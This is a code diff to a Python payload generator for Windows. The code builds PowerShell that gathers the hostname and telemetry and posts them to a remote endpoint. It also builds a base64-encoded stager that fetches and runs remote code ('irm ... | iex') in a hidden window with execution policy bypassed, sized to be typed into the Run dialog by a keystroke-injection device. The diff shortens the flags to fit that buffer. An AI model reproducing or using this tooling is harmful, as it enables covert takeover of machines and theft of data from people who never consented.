@@ -97,7 +97,7 @@ class WindowsPayloadGenerator:
             f"$p=@{{os_type='windows';category='{cat}';hostname=$env:COMPUTERNAME;telemetry=$t}};"
             f"$j=ConvertTo-Json -Compress -Depth 4 $p;"
             f"$b=[System.Text.Encoding]::UTF8.GetBytes($j);"
-            f"try{{Invoke-RestMethod -Uri '{endpoint_uri}' -Method Post -Body $b -ContentType 'application/json; charset=utf-8' -TimeoutSec 10}}catch{{"
+            f"try{{Invoke-RestMethod -UseBasicParsing -Uri '{endpoint_uri}' -Method Post -Body $b -ContentType 'application/json; charset=utf-8' -TimeoutSec 10}}catch{{"
             f"try{{$wc=New-Object System.Net.WebClient;$wc.Headers.Add('Content-Type','application/json; charset=utf-8');$wc.UploadData('{endpoint_uri}','POST',$b)}}catch{{}}}}"
         )
         return " ".join(line.strip() for line in script.splitlines() if line.strip())
@@ -110,10 +110,10 @@ class WindowsPayloadGenerator:
         Fits easily inside the Windows Run dialog (Win+R) buffer (<260 chars) and types in ~5 seconds.
         """
         cat = cls.normalize_category(category)
-        stager = f"irm {server_url.rstrip('/')}/w/{cat}|iex"
+        stager = f"irm -useb {server_url.rstrip('/')}/w/{cat}|iex"
         encoded_bytes = stager.encode("utf-16le")
         b64_cmd = base64.b64encode(encoded_bytes).decode("ascii")
-        return f"powershell -WindowStyle Hidden -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {b64_cmd}"
+        return f"powershell -w h -NoProfile -NonInteractive -ep bypass -EncodedCommand {b64_cmd}"
 
 
 class WindowsHIDPlugin(IDiagnosticPlugin):
